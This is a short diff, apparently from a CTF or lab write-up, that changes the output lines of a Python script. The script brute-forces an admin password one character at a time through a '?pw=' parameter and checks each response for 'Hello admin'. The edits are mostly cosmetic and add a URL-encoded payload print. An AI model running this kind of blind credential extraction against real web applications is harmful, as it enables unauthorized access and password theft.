@@ -29,8 +29,8 @@ for x in range(0, 10):
 
 print()    
 print(f"[!] Payload: ?pw={payload}")
+print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
 print(f"[!] Password length: {password_length}")
-print()
 
 password = ""
 searchspace = string.digits + string.ascii_letters
@@ -45,12 +45,14 @@ for index in range(1, password_length + 1):
 
     if "Hello admin" in response.text:
       password += char
+      print()
       print(f"[+] Payload: ?pw={payload}")
+      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
       print(f"[+] Character at index {index}: {char}")
       break
 
 print()
-print(f"[!] Extracted Password: {password}")
+print(f"[!] Extracted password: {password}")
 print(f"[!] Final payload: ?pw={password}")
 ```
 
